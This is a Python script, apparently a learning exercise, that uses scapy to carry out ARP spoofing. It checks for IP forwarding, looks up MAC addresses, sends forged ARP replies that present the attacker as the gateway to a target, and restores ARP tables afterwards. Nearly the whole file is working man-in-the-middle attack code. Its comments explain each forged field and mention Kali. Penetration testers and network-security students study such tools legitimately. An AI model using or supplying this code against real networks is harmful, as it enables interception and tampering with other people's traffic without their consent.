#/usr/bin/env python
from scapy.layers.l2 import ARP, Ether
from scapy.all import srp, sendp

def check_port_forwarding():
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            value = f.read().strip()
        if value == "1":
            print("[+] Port Forwarding enabled we can proceed.")
        elif value == "0":
            print("[-] Port Forwarding disabled. Please enable.")
            exit()
        else:
            print("[-] Unexpected value " + str(value))
            exit()
    except OSError:
        print(
            "The file /proc/sys/net/ipv4/ip_forward was not found. System may not support IP forwarding, or is not Linux or Mac.")
    except Exception as e:
        print("An error occurred while trying to connect to IPv4. " + str(e))

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_request = broadcast / arp_request
    answered_list = srp(broadcast_arp_request, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip, get_mac_address):
    target_mac = get_mac_address(target_ip)
    # Send packet to Client (target_ip), telling it I have the Router (gateway) MAC Address.
    # ARP fields: op=2 (ARP Response). pdst=[TARGET_IP]. hwdst=[TARGET_MAC].
    # psrc=[SPOOF_IP](GATEWAY_IP) > tells the target I am the router
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(packet, verbose=False)

# 2. When we quit, restore the ARP tables in the router and the target.
def restore(destination_ip, source_ip, get_mac_address): # Gonna call this with import get_mac
    target_mac = get_mac_address(destination_ip) # Using get_mac from above here
    source_mac = get_mac_address(source_ip)
    # Creating an ARP Response (op to 2), with the following fields (arguments)
    # pdst: IP Destination.
    # hwdst: HW (MAC Address) Destination.
    # psrc: IP Source.
    # hwsrc: MAC Address Source.  Essential otherwise Kali will still set the source MAC as my MAC.
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    # count is 4, send the packet 4 times to make sure the target will receive it.
    sendp(packet, count=4, verbose=False)


